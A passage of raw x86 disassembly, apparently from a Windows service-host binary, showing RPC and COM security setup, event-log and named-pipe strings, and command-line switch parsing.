 1001d45:	8b 75 10             	mov    0x10(%ebp),%esi
 1001d48:	89 06                	mov    %eax,(%esi)
 1001d4a:	0f 84 d8 10 00 00    	je     0x1002e28
 1001d50:	ff 75 08             	push   0x8(%ebp)
 1001d53:	50                   	push   %eax
 1001d54:	ff 75 fc             	push   -0x4(%ebp)
 1001d57:	ff 15 1c 11 00 01    	call   *0x100111c
 1001d5d:	85 c0                	test   %eax,%eax
 1001d5f:	ff 36                	push   (%esi)
 1001d61:	89 45 08             	mov    %eax,0x8(%ebp)
 1001d64:	0f 8c c8 10 00 00    	jl     0x1002e32
 1001d6a:	ff d3                	call   *%ebx
 1001d6c:	fe 00                	incb   (%eax)
 1001d6e:	57                   	push   %edi
 1001d6f:	ff 36                	push   (%esi)
 1001d71:	ff 15 f8 10 00 01    	call   *0x10010f8
 1001d77:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 1001d7a:	89 08                	mov    %ecx,(%eax)
 1001d7c:	33 c0                	xor    %eax,%eax
 1001d7e:	5f                   	pop    %edi
 1001d7f:	5e                   	pop    %esi
 1001d80:	5b                   	pop    %ebx
 1001d81:	c9                   	leave
 1001d82:	c2 0c 00             	ret    $0xc
 1001d85:	83 7d f0 04          	cmpl   $0x4,-0x10(%ebp)
 1001d89:	0f 85 f1 f9 ff ff    	jne    0x1001780
 1001d8f:	83 7d f8 01          	cmpl   $0x1,-0x8(%ebp)
 1001d93:	0f 85 e7 f9 ff ff    	jne    0x1001780
 1001d99:	39 5e 0c             	cmp    %ebx,0xc(%esi)
 1001d9c:	0f 85 de f9 ff ff    	jne    0x1001780
 1001da2:	e9 74 0c 00 00       	jmp    0x1002a1b
 1001da7:	90                   	nop
 1001da8:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
 1001dac:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
 1001db0:	74 00                	je     0x1001db2
 1001db2:	6c                   	insb   (%dx),%es:(%edi)
 1001db3:	00 6f 00             	add    %ch,0x0(%edi)
 1001db6:	67 00 00             	add    %al,(%bx,%si)
 1001db9:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
 1001dbf:	ff 25 14 11 00 01    	jmp    *0x1001114
 1001dc5:	90                   	nop
 1001dc6:	90                   	nop
 1001dc7:	90                   	nop
 1001dc8:	90                   	nop
 1001dc9:	90                   	nop
 1001dca:	ff 25 dc 10 00 01    	jmp    *0x10010dc
 1001dd0:	90                   	nop
 1001dd1:	90                   	nop
 1001dd2:	90                   	nop
 1001dd3:	90                   	nop
 1001dd4:	90                   	nop
 1001dd5:	ff 25 e0 10 00 01    	jmp    *0x10010e0
 1001ddb:	90                   	nop
 1001ddc:	90                   	nop
 1001ddd:	90                   	nop
 1001dde:	90                   	nop
 1001ddf:	90                   	nop
 1001de0:	8b ff                	mov    %edi,%edi
 1001de2:	55                   	push   %ebp
 1001de3:	8b ec                	mov    %esp,%ebp
 1001de5:	56                   	push   %esi
 1001de6:	57                   	push   %edi
 1001de7:	be 74 40 00 01       	mov    $0x1004074,%esi
 1001dec:	56                   	push   %esi
 1001ded:	ff 15 68 10 00 01    	call   *0x1001068
 1001df3:	ff 75 0c             	push   0xc(%ebp)
 1001df6:	ff 75 08             	push   0x8(%ebp)
 1001df9:	e8 49 00 00 00       	call   0x1001e47
 1001dfe:	8b f8                	mov    %eax,%edi
 1001e00:	85 ff                	test   %edi,%edi
 1001e02:	75 2a                	jne    0x1001e2e
 1001e04:	ff 05 70 40 00 01    	incl   0x1004070
 1001e0a:	83 3d 70 40 00 01 01 	cmpl   $0x1,0x1004070
 1001e11:	75 1b                	jne    0x1001e2e
 1001e13:	6a 01                	push   $0x1
 1001e15:	68 39 30 00 00       	push   $0x3039
 1001e1a:	6a 01                	push   $0x1
 1001e1c:	ff 15 34 11 00 01    	call   *0x1001134
 1001e22:	8b f8                	mov    %eax,%edi
 1001e24:	81 ff b1 06 00 00    	cmp    $0x6b1,%edi
 1001e2a:	75 02                	jne    0x1001e2e
 1001e2c:	33 ff                	xor    %edi,%edi
 1001e2e:	56                   	push   %esi
 1001e2f:	ff 15 60 10 00 01    	call   *0x1001060
 1001e35:	57                   	push   %edi
 1001e36:	ff 15 40 11 00 01    	call   *0x1001140
 1001e3c:	5f                   	pop    %edi
 1001e3d:	5e                   	pop    %esi
 1001e3e:	5d                   	pop    %ebp
 1001e3f:	c2 08 00             	ret    $0x8
 1001e42:	90                   	nop
 1001e43:	90                   	nop
 1001e44:	90                   	nop
 1001e45:	90                   	nop
 1001e46:	90                   	nop
 1001e47:	8b ff                	mov    %edi,%edi
 1001e49:	55                   	push   %ebp
 1001e4a:	8b ec                	mov    %esp,%ebp
 1001e4c:	51                   	push   %ecx
 1001e4d:	53                   	push   %ebx
 1001e4e:	56                   	push   %esi
 1001e4f:	ff 75 08             	push   0x8(%ebp)
 1001e52:	33 db                	xor    %ebx,%ebx
 1001e54:	89 5d fc             	mov    %ebx,-0x4(%ebp)
 1001e57:	e8 63 ff ff ff       	call   0x1001dbf
 1001e5c:	59                   	pop    %ecx
 1001e5d:	8d 44 00 10          	lea    0x10(%eax,%eax,1),%eax
 1001e61:	50                   	push   %eax
 1001e62:	53                   	push   %ebx
 1001e63:	ff 15 c0 10 00 01    	call   *0x10010c0
 1001e69:	8b f0                	mov    %eax,%esi
 1001e6b:	3b f3                	cmp    %ebx,%esi
 1001e6d:	0f 84 89 0f 00 00    	je     0x1002dfc
 1001e73:	57                   	push   %edi
 1001e74:	68 04 1f 00 01       	push   $0x1001f04
 1001e79:	56                   	push   %esi
 1001e7a:	e8 56 ff ff ff       	call   0x1001dd5
 1001e7f:	ff 75 08             	push   0x8(%ebp)
 1001e82:	56                   	push   %esi
 1001e83:	e8 42 ff ff ff       	call   0x1001dca
 1001e88:	83 c4 10             	add    $0x10,%esp
 1001e8b:	8d 45 fc             	lea    -0x4(%ebp),%eax
 1001e8e:	50                   	push   %eax
 1001e8f:	ff 75 08             	push   0x8(%ebp)
 1001e92:	e8 80 00 00 00       	call   0x1001f17
 1001e97:	8b f8                	mov    %eax,%edi
 1001e99:	3b fb                	cmp    %ebx,%edi
 1001e9b:	0f 8c 65 0f 00 00    	jl     0x1002e06
 1001ea1:	ff 75 fc             	push   -0x4(%ebp)
 1001ea4:	56                   	push   %esi
 1001ea5:	6a 0a                	push   $0xa
 1001ea7:	68 f0 1e 00 01       	push   $0x1001ef0
 1001eac:	ff 15 38 11 00 01    	call   *0x1001138
 1001eb2:	8b f8                	mov    %eax,%edi
 1001eb4:	3b fb                	cmp    %ebx,%edi
 1001eb6:	75 2d                	jne    0x1001ee5
 1001eb8:	53                   	push   %ebx
 1001eb9:	53                   	push   %ebx
 1001eba:	ff 75 0c             	push   0xc(%ebp)
 1001ebd:	ff 15 3c 11 00 01    	call   *0x100113c
 1001ec3:	8b f8                	mov    %eax,%edi
 1001ec5:	56                   	push   %esi
 1001ec6:	8b 35 4c 10 00 01    	mov    0x100104c,%esi
 1001ecc:	ff d6                	call   *%esi
 1001ece:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
 1001ed1:	0f 85 3d 0f 00 00    	jne    0x1002e14
 1001ed7:	57                   	push   %edi
 1001ed8:	ff 15 40 11 00 01    	call   *0x1001140
 1001ede:	5f                   	pop    %edi
 1001edf:	5e                   	pop    %esi
 1001ee0:	5b                   	pop    %ebx
 1001ee1:	c9                   	leave
 1001ee2:	c2 08 00             	ret    $0x8
 1001ee5:	81 ff cc 06 00 00    	cmp    $0x6cc,%edi
 1001eeb:	75 d8                	jne    0x1001ec5
 1001eed:	eb c9                	jmp    0x1001eb8
 1001eef:	90                   	nop
 1001ef0:	6e                   	outsb  %ds:(%esi),(%dx)
 1001ef1:	00 63 00             	add    %ah,0x0(%ebx)
 1001ef4:	61                   	popa
 1001ef5:	00 63 00             	add    %ah,0x0(%ebx)
 1001ef8:	6e                   	outsb  %ds:(%esi),(%dx)
 1001ef9:	00 5f 00             	add    %bl,0x0(%edi)
 1001efc:	6e                   	outsb  %ds:(%esi),(%dx)
 1001efd:	00 70 00             	add    %dh,0x0(%eax)
 1001f00:	00 00                	add    %al,(%eax)
 1001f02:	90                   	nop
 1001f03:	90                   	nop
 1001f04:	5c                   	pop    %esp
 1001f05:	00 50 00             	add    %dl,0x0(%eax)
 1001f08:	49                   	dec    %ecx
 1001f09:	00 50 00             	add    %dl,0x0(%eax)
 1001f0c:	45                   	inc    %ebp
 1001f0d:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
 1001f11:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
 1001f17:	8b ff                	mov    %edi,%edi
 1001f19:	55                   	push   %ebp
 1001f1a:	8b ec                	mov    %esp,%ebp
 1001f1c:	83 ec 54             	sub    $0x54,%esp
 1001f1f:	8b 45 0c             	mov    0xc(%ebp),%eax
 1001f22:	53                   	push   %ebx
 1001f23:	56                   	push   %esi
 1001f24:	8b 35 ec 10 00 01    	mov    0x10010ec,%esi
 1001f2a:	57                   	push   %edi
 1001f2b:	ff 75 08             	push   0x8(%ebp)
 1001f2e:	33 ff                	xor    %edi,%edi
 1001f30:	89 38                	mov    %edi,(%eax)
 1001f32:	8d 45 e0             	lea    -0x20(%ebp),%eax
 1001f35:	50                   	push   %eax
 1001f36:	ff d6                	call   *%esi
 1001f38:	33 db                	xor    %ebx,%ebx
 1001f3a:	ff b3 8c 40 00 01    	push   0x100408c(%ebx)
 1001f40:	8d 45 d8             	lea    -0x28(%ebp),%eax
 1001f43:	50                   	push   %eax
 1001f44:	ff d6                	call   *%esi
 1001f46:	6a 01                	push   $0x1
 1001f48:	8d 45 e0             	lea    -0x20(%ebp),%eax
 1001f4b:	50                   	push   %eax
 1001f4c:	8d 45 d8             	lea    -0x28(%ebp),%eax
 1001f4f:	50                   	push   %eax
 1001f50:	ff 15 e8 10 00 01    	call   *0x10010e8
 1001f56:	85 c0                	test   %eax,%eax
 1001f58:	0f 84 99 0b 00 00    	je     0x1002af7
 1001f5e:	83 c3 04             	add    $0x4,%ebx
 1001f61:	83 fb 04             	cmp    $0x4,%ebx
 1001f64:	72 d4                	jb     0x1001f3a
 1001f66:	be 34 00 00 c0       	mov    $0xc0000034,%esi
 1001f6b:	3b f7                	cmp    %edi,%esi
 1001f6d:	0f 8d 1d 0c 00 00    	jge    0x1002b90
 1001f73:	81 fe 34 00 00 c0    	cmp    $0xc0000034,%esi
 1001f79:	0f 85 65 0b 00 00    	jne    0x1002ae4
 1001f7f:	8b 45 0c             	mov    0xc(%ebp),%eax
 1001f82:	89 38                	mov    %edi,(%eax)
 1001f84:	33 c0                	xor    %eax,%eax
 1001f86:	5f                   	pop    %edi
 1001f87:	5e                   	pop    %esi
 1001f88:	5b                   	pop    %ebx
 1001f89:	c9                   	leave
 1001f8a:	c2 08 00             	ret    $0x8
 1001f8d:	90                   	nop
 1001f8e:	90                   	nop
 1001f8f:	90                   	nop
 1001f90:	90                   	nop
 1001f91:	90                   	nop
 1001f92:	8b ff                	mov    %edi,%edi
 1001f94:	55                   	push   %ebp
 1001f95:	8b ec                	mov    %esp,%ebp
 1001f97:	8b 45 08             	mov    0x8(%ebp),%eax
 1001f9a:	a3 3c 40 00 01       	mov    %eax,0x100403c
 1001f9f:	5d                   	pop    %ebp
 1001fa0:	c2 04 00             	ret    $0x4
 1001fa3:	90                   	nop
 1001fa4:	90                   	nop
 1001fa5:	90                   	nop
 1001fa6:	90                   	nop
 1001fa7:	90                   	nop
 1001fa8:	8b ff                	mov    %edi,%edi
 1001faa:	55                   	push   %ebp
 1001fab:	8b ec                	mov    %esp,%ebp
 1001fad:	53                   	push   %ebx
 1001fae:	56                   	push   %esi
 1001faf:	8b 75 0c             	mov    0xc(%ebp),%esi
 1001fb2:	68 94 40 00 01       	push   $0x1004094
 1001fb7:	6a 07                	push   $0x7
 1001fb9:	ff 76 0c             	push   0xc(%esi)
 1001fbc:	ff 75 08             	push   0x8(%ebp)
 1001fbf:	e8 62 f5 ff ff       	call   0x1001526
 1001fc4:	8b d8                	mov    %eax,%ebx
 1001fc6:	85 db                	test   %ebx,%ebx
 1001fc8:	75 16                	jne    0x1001fe0
 1001fca:	a1 94 40 00 01       	mov    0x1004094,%eax
 1001fcf:	85 c0                	test   %eax,%eax
 1001fd1:	0f 84 7d 09 00 00    	je     0x1002954
 1001fd7:	66 39 18             	cmp    %bx,(%eax)
 1001fda:	0f 84 74 09 00 00    	je     0x1002954
 1001fe0:	8d 45 0c             	lea    0xc(%ebp),%eax
 1001fe3:	50                   	push   %eax
 1001fe4:	68 19 00 02 00       	push   $0x20019
 1001fe9:	6a 00                	push   $0x0
 1001feb:	ff 76 0c             	push   0xc(%esi)
 1001fee:	ff 75 08             	push   0x8(%ebp)
 1001ff1:	ff 15 30 10 00 01    	call   *0x1001030
 1001ff7:	85 c0                	test   %eax,%eax
 1001ff9:	0f 85 a2 00 00 00    	jne    0x10020a1
 1001fff:	8d 45 08             	lea    0x8(%ebp),%eax
 1002002:	50                   	push   %eax
 1002003:	68 5c 21 00 01       	push   $0x100215c
 1002008:	ff 75 0c             	push   0xc(%ebp)
 100200b:	e8 e1 05 00 00       	call   0x10025f1
 1002010:	85 c0                	test   %eax,%eax
 1002012:	75 06                	jne    0x100201a
 1002014:	8b 45 08             	mov    0x8(%ebp),%eax
 1002017:	89 46 10             	mov    %eax,0x10(%esi)
 100201a:	83 7e 10 00          	cmpl   $0x0,0x10(%esi)
 100201e:	74 5f                	je     0x100207f
 1002020:	8d 45 08             	lea    0x8(%ebp),%eax
 1002023:	50                   	push   %eax
 1002024:	68 34 21 00 01       	push   $0x1002134
 1002029:	ff 75 0c             	push   0xc(%ebp)
 100202c:	e8 c0 05 00 00       	call   0x10025f1
 1002031:	85 c0                	test   %eax,%eax
 1002033:	0f 84 cc 09 00 00    	je     0x1002a05
 1002039:	c7 46 14 04 00 00 00 	movl   $0x4,0x14(%esi)
 1002040:	8d 45 08             	lea    0x8(%ebp),%eax
 1002043:	50                   	push   %eax
 1002044:	68 0c 21 00 01       	push   $0x100210c
 1002049:	ff 75 0c             	push   0xc(%ebp)
 100204c:	e8 a0 05 00 00       	call   0x10025f1
 1002051:	85 c0                	test   %eax,%eax
 1002053:	0f 84 b7 09 00 00    	je     0x1002a10
 1002059:	c7 46 18 02 00 00 00 	movl   $0x2,0x18(%esi)
 1002060:	8d 45 08             	lea    0x8(%ebp),%eax
 1002063:	50                   	push   %eax
 1002064:	68 d4 20 00 01       	push   $0x10020d4
 1002069:	ff 75 0c             	push   0xc(%ebp)
 100206c:	e8 80 05 00 00       	call   0x10025f1
 1002071:	85 c0                	test   %eax,%eax
 1002073:	0f 85 cf 08 00 00    	jne    0x1002948
 1002079:	8b 45 08             	mov    0x8(%ebp),%eax
 100207c:	89 46 1c             	mov    %eax,0x1c(%esi)
 100207f:	8d 45 08             	lea    0x8(%ebp),%eax
 1002082:	50                   	push   %eax
 1002083:	68 ac 20 00 01       	push   $0x10020ac
 1002088:	ff 75 0c             	push   0xc(%ebp)
 100208b:	e8 61 05 00 00       	call   0x10025f1
 1002090:	85 c0                	test   %eax,%eax
 1002092:	0f 84 c4 08 00 00    	je     0x100295c
 1002098:	ff 75 0c             	push   0xc(%ebp)
 100209b:	ff 15 2c 10 00 01    	call   *0x100102c
 10020a1:	5e                   	pop    %esi
 10020a2:	8b c3                	mov    %ebx,%eax
 10020a4:	5b                   	pop    %ebx
 10020a5:	5d                   	pop    %ebp
 10020a6:	c2 08 00             	ret    $0x8
 10020a9:	90                   	nop
 10020aa:	90                   	nop
 10020ab:	90                   	nop
 10020ac:	44                   	inc    %esp
 10020ad:	00 65 00             	add    %ah,0x0(%ebp)
 10020b0:	66 00 61 00          	data16 add %ah,0x0(%ecx)
 10020b4:	75 00                	jne    0x10020b6
 10020b6:	6c                   	insb   (%dx),%es:(%edi)
 10020b7:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
 10020bb:	00 70 00             	add    %dh,0x0(%eax)
 10020be:	63 00                	arpl   %eax,(%eax)
 10020c0:	53                   	push   %ebx
 10020c1:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
 10020c5:	00 63 00             	add    %ah,0x0(%ebx)
 10020c8:	6b 00 53             	imul   $0x53,(%eax),%eax
 10020cb:	00 69 00             	add    %ch,0x0(%ecx)
 10020ce:	7a 00                	jp     0x10020d0
 10020d0:	65 00 00             	add    %al,%gs:(%eax)
 10020d3:	00 41 00             	add    %al,0x0(%ecx)
 10020d6:	75 00                	jne    0x10020d8
 10020d8:	74 00                	je     0x10020da
 10020da:	68 00 65 00 6e       	push   $0x6e006500
 10020df:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
 10020e3:	00 63 00             	add    %ah,0x0(%ebx)
 10020e6:	61                   	popa
 10020e7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
 10020eb:	00 6f 00             	add    %ch,0x0(%edi)
 10020ee:	6e                   	outsb  %ds:(%esi),(%dx)
 10020ef:	00 43 00             	add    %al,0x0(%ebx)
 10020f2:	61                   	popa
 10020f3:	00 70 00             	add    %dh,0x0(%eax)
 10020f6:	61                   	popa
 10020f7:	00 62 00             	add    %ah,0x0(%edx)
 10020fa:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
 1002100:	74 00                	je     0x1002102
 1002102:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
 1002108:	00 00                	add    %al,(%eax)
 100210a:	90                   	nop
 100210b:	90                   	nop
 100210c:	49                   	dec    %ecx
 100210d:	00 6d 00             	add    %ch,0x0(%ebp)
 1002110:	70 00                	jo     0x1002112
 1002112:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
 1002116:	73 00                	jae    0x1002118
 1002118:	6f                   	outsl  %ds:(%esi),(%dx)
 1002119:	00 6e 00             	add    %ch,0x0(%esi)
 100211c:	61                   	popa
 100211d:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
 1002121:	00 6f 00             	add    %ch,0x0(%edi)
 1002124:	6e                   	outsb  %ds:(%esi),(%dx)
 1002125:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
 1002129:	00 76 00             	add    %dh,0x0(%esi)
 100212c:	65 00 6c 00 00       	add    %ch,%gs:0x0(%eax,%eax,1)
 1002131:	00 90 90 41 00 75    	add    %dl,0x75004190(%eax)
 1002137:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
 100213b:	00 65 00             	add    %ah,0x0(%ebp)
 100213e:	6e                   	outsb  %ds:(%esi),(%dx)
 100213f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
 1002143:	00 63 00             	add    %ah,0x0(%ebx)
 1002146:	61                   	popa
 1002147:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
 100214b:	00 6f 00             	add    %ch,0x0(%edi)
 100214e:	6e                   	outsb  %ds:(%esi),(%dx)
 100214f:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
 1002153:	00 76 00             	add    %dh,0x0(%esi)
 1002156:	65 00 6c 00 00       	add    %ch,%gs:0x0(%eax,%eax,1)
 100215b:	00 43 00             	add    %al,0x0(%ebx)
 100215e:	6f                   	outsl  %ds:(%esi),(%dx)
 100215f:	00 49 00             	add    %cl,0x0(%ecx)
 1002162:	6e                   	outsb  %ds:(%esi),(%dx)
 1002163:	00 69 00             	add    %ch,0x0(%ecx)
 1002166:	74 00                	je     0x1002168
 1002168:	69 00 61 00 6c 00    	imul   $0x6c0061,(%eax),%eax
 100216e:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
 1002174:	53                   	push   %ebx
 1002175:	00 65 00             	add    %ah,0x0(%ebp)
 1002178:	63 00                	arpl   %eax,(%eax)
 100217a:	75 00                	jne    0x100217c
 100217c:	72 00                	jb     0x100217e
 100217e:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
 1002184:	50                   	push   %eax
 1002185:	00 61 00             	add    %ah,0x0(%ecx)
 1002188:	72 00                	jb     0x100218a
 100218a:	61                   	popa
 100218b:	00 6d 00             	add    %ch,0x0(%ebp)
 100218e:	00 00                	add    %al,(%eax)
 1002190:	90                   	nop
 1002191:	90                   	nop
 1002192:	90                   	nop
 1002193:	90                   	nop
 1002194:	90                   	nop
 1002195:	8b ff                	mov    %edi,%edi
 1002197:	56                   	push   %esi
 1002198:	57                   	push   %edi
 1002199:	bf 20 40 00 01       	mov    $0x1004020,%edi
 100219e:	57                   	push   %edi
 100219f:	ff 15 68 10 00 01    	call   *0x1001068
 10021a5:	a1 40 40 00 01       	mov    0x1004040,%eax
 10021aa:	8d 04 c5 08 00 00 00 	lea    0x8(,%eax,8),%eax
 10021b1:	50                   	push   %eax
 10021b2:	6a 08                	push   $0x8
 10021b4:	e8 f8 f0 ff ff       	call   0x10012b1
 10021b9:	8b f0                	mov    %eax,%esi
 10021bb:	33 c9                	xor    %ecx,%ecx
 10021bd:	3b f1                	cmp    %ecx,%esi
 10021bf:	74 2a                	je     0x10021eb
 10021c1:	33 c0                	xor    %eax,%eax
 10021c3:	39 0d 40 40 00 01    	cmp    %ecx,0x1004040
 10021c9:	76 20                	jbe    0x10021eb
 10021cb:	8b 15 38 40 00 01    	mov    0x1004038,%edx
 10021d1:	8b 14 11             	mov    (%ecx,%edx,1),%edx
 10021d4:	89 14 c6             	mov    %edx,(%esi,%eax,8)
 10021d7:	c7 44 c6 04 a5 16 00 	movl   $0x10016a5,0x4(%esi,%eax,8)
 10021de:	01 
 10021df:	40                   	inc    %eax
 10021e0:	83 c1 14             	add    $0x14,%ecx
 10021e3:	3b 05 40 40 00 01    	cmp    0x1004040,%eax
 10021e9:	72 e0                	jb     0x10021cb
 10021eb:	57                   	push   %edi
 10021ec:	ff 15 60 10 00 01    	call   *0x1001060
 10021f2:	5f                   	pop    %edi
 10021f3:	8b c6                	mov    %esi,%eax
 10021f5:	5e                   	pop    %esi
 10021f6:	c3                   	ret
 10021f7:	90                   	nop
 10021f8:	90                   	nop
 10021f9:	90                   	nop
 10021fa:	90                   	nop
 10021fb:	90                   	nop
 10021fc:	8b ff                	mov    %edi,%edi
 10021fe:	55                   	push   %ebp
 10021ff:	8b ec                	mov    %esp,%ebp
 1002201:	83 ec 10             	sub    $0x10,%esp
 1002204:	a1 44 40 00 01       	mov    0x1004044,%eax
 1002209:	85 c0                	test   %eax,%eax
 100220b:	74 07                	je     0x1002214
 100220d:	3d 40 bb 00 00       	cmp    $0xbb40,%eax
 1002212:	75 4c                	jne    0x1002260
 1002214:	56                   	push   %esi
 1002215:	8d 45 f8             	lea    -0x8(%ebp),%eax
 1002218:	50                   	push   %eax
 1002219:	ff 15 b4 10 00 01    	call   *0x10010b4
 100221f:	8b 75 fc             	mov    -0x4(%ebp),%esi
 1002222:	33 75 f8             	xor    -0x8(%ebp),%esi
 1002225:	ff 15 b0 10 00 01    	call   *0x10010b0
 100222b:	33 f0                	xor    %eax,%esi
 100222d:	ff 15 ac 10 00 01    	call   *0x10010ac
 1002233:	33 f0                	xor    %eax,%esi
 1002235:	ff 15 a8 10 00 01    	call   *0x10010a8
 100223b:	33 f0                	xor    %eax,%esi
 100223d:	8d 45 f0             	lea    -0x10(%ebp),%eax
 1002240:	50                   	push   %eax
 1002241:	ff 15 a4 10 00 01    	call   *0x10010a4
 1002247:	8b 45 f4             	mov    -0xc(%ebp),%eax
 100224a:	33 45 f0             	xor    -0x10(%ebp),%eax
 100224d:	33 c6                	xor    %esi,%eax
 100224f:	25 ff ff 00 00       	and    $0xffff,%eax
 1002254:	5e                   	pop    %esi
 1002255:	0f 84 7f 08 00 00    	je     0x1002ada
 100225b:	a3 44 40 00 01       	mov    %eax,0x1004044
 1002260:	f7 d0                	not    %eax
 1002262:	a3 90 40 00 01       	mov    %eax,0x1004090
 1002267:	c9                   	leave
 1002268:	c3                   	ret
 1002269:	46                   	inc    %esi
 100226a:	46                   	inc    %esi
 100226b:	66 8b 06             	mov    (%esi),%ax
 100226e:	66 3b c7             	cmp    %di,%ax
 1002271:	0f 84 db 00 00 00    	je     0x1002352
 1002277:	e9 c2 00 00 00       	jmp    0x100233e
 100227c:	66 3d 4b 00          	cmp    $0x4b,%ax
 1002280:	75 23                	jne    0x10022a5
 1002282:	eb 14                	jmp    0x1002298
 1002284:	46                   	inc    %esi
 1002285:	46                   	inc    %esi
 1002286:	66 8b 06             	mov    (%esi),%ax
 1002289:	66 3b c7             	cmp    %di,%ax
 100228c:	0f 84 dc 00 00 00    	je     0x100236e
 1002292:	66 3d 6b 00          	cmp    $0x6b,%ax
 1002296:	75 e4                	jne    0x100227c
 1002298:	8d 43 0c             	lea    0xc(%ebx),%eax
 100229b:	c7 43 08 01 00 00 00 	movl   $0x1,0x8(%ebx)
 10022a2:	89 45 fc             	mov    %eax,-0x4(%ebp)
 10022a5:	46                   	inc    %esi
 10022a6:	46                   	inc    %esi
 10022a7:	e9 8a 00 00 00       	jmp    0x1002336
 10022ac:	90                   	nop
 10022ad:	90                   	nop
 10022ae:	90                   	nop
 10022af:	90                   	nop
 10022b0:	90                   	nop
 10022b1:	8b ff                	mov    %edi,%edi
 10022b3:	55                   	push   %ebp
 10022b4:	8b ec                	mov    %esp,%ebp
 10022b6:	51                   	push   %ecx
 10022b7:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
 10022bb:	0f 84 95 07 00 00    	je     0x1002a56
 10022c1:	53                   	push   %ebx
 10022c2:	56                   	push   %esi
 10022c3:	ff 75 08             	push   0x8(%ebp)
 10022c6:	ff 15 48 10 00 01    	call   *0x1001048
 10022cc:	8d 74 00 02          	lea    0x2(%eax,%eax,1),%esi
 10022d0:	8d 46 24             	lea    0x24(%esi),%eax
 10022d3:	50                   	push   %eax
 10022d4:	6a 08                	push   $0x8
 10022d6:	e8 d6 ef ff ff       	call   0x10012b1
 10022db:	8b d8                	mov    %eax,%ebx
 10022dd:	85 db                	test   %ebx,%ebx
 10022df:	0f 84 dc 00 00 00    	je     0x10023c1
 10022e5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 10022e9:	8b ce                	mov    %esi,%ecx
 10022eb:	8b 75 08             	mov    0x8(%ebp),%esi
 10022ee:	8b c1                	mov    %ecx,%eax
 10022f0:	57                   	push   %edi
 10022f1:	c1 e9 02             	shr    $0x2,%ecx
 10022f4:	8d 7b 24             	lea    0x24(%ebx),%edi
 10022f7:	89 3b                	mov    %edi,(%ebx)
 10022f9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 10022fb:	8b c8                	mov    %eax,%ecx
 10022fd:	83 e1 03             	and    $0x3,%ecx
 1002300:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
 1002302:	8b 33                	mov    (%ebx),%esi
 1002304:	33 ff                	xor    %edi,%edi
 1002306:	89 73 04             	mov    %esi,0x4(%ebx)
 1002309:	66 39 3e             	cmp    %di,(%esi)
 100230c:	74 20                	je     0x100232e
 100230e:	66 8b 06             	mov    (%esi),%ax
 1002311:	66 3d 20 00          	cmp    $0x20,%ax
 1002315:	74 0d                	je     0x1002324
 1002317:	66 3d 09 00          	cmp    $0x9,%ax
 100231b:	74 07                	je     0x1002324
 100231d:	46                   	inc    %esi
 100231e:	46                   	inc    %esi
 100231f:	66 39 3e             	cmp    %di,(%esi)
 1002322:	75 ea                	jne    0x100230e
 1002324:	66 39 3e             	cmp    %di,(%esi)
 1002327:	74 05                	je     0x100232e
 1002329:	66 89 3e             	mov    %di,(%esi)
 100232c:	46                   	inc    %esi
 100232d:	46                   	inc    %esi
 100232e:	ff 73 04             	push   0x4(%ebx)
 1002331:	e8 bc f1 ff ff       	call   0x10014f2
 1002336:	66 8b 06             	mov    (%esi),%ax
 1002339:	66 3b c7             	cmp    %di,%ax
 100233c:	74 6f                	je     0x10023ad
 100233e:	66 3d 20 00          	cmp    $0x20,%ax
 1002342:	0f 84 21 ff ff ff    	je     0x1002269
 1002348:	66 3d 09 00          	cmp    $0x9,%ax
 100234c:	0f 84 17 ff ff ff    	je     0x1002269
 1002352:	66 8b 06             	mov    (%esi),%ax
 1002355:	66 3b c7             	cmp    %di,%ax
 1002358:	74 53                	je     0x10023ad
 100235a:	66 3d 2d 00          	cmp    $0x2d,%ax
 100235e:	0f 84 20 ff ff ff    	je     0x1002284
 1002364:	66 3d 2f 00          	cmp    $0x2f,%ax
 1002368:	0f 84 16 ff ff ff    	je     0x1002284
 100236e:	66 3d 22 00          	cmp    $0x22,%ax
 1002372:	8b ce                	mov    %esi,%ecx
 1002374:	0f 84 e3 06 00 00    	je     0x1002a5d
 100237a:	66 39 3e             	cmp    %di,(%esi)
 100237d:	74 1f                	je     0x100239e
 100237f:	66 8b 06             	mov    (%esi),%ax
 1002382:	66 3d 20 00          	cmp    $0x20,%ax
 1002386:	74 0d                	je     0x1002395
 1002388:	66 3d 09 00          	cmp    $0x9,%ax
 100238c:	74 07                	je     0x1002395
 100238e:	46                   	inc    %esi
 100238f:	46                   	inc    %esi
 1002390:	66 39 3e             	cmp    %di,(%esi)
 1002393:	75 ea                	jne    0x100237f
 1002395:	66 39 3e             	cmp    %di,(%esi)
 1002398:	0f 85 e8 06 00 00    	jne    0x1002a86
 100239e:	39 7d fc             	cmp    %edi,-0x4(%ebp)
 10023a1:	74 93                	je     0x1002336
 10023a3:	8b 45 fc             	mov    -0x4(%ebp),%eax
 10023a6:	89 08                	mov    %ecx,(%eax)
 10023a8:	89 7d fc             	mov    %edi,-0x4(%ebp)
 10023ab:	eb 89                	jmp    0x1002336
 10023ad:	33 c0                	xor    %eax,%eax
 10023af:	39 7b 0c             	cmp    %edi,0xc(%ebx)
 10023b2:	0f 95 c0             	setne  %al
 10023b5:	3b c7                	cmp    %edi,%eax
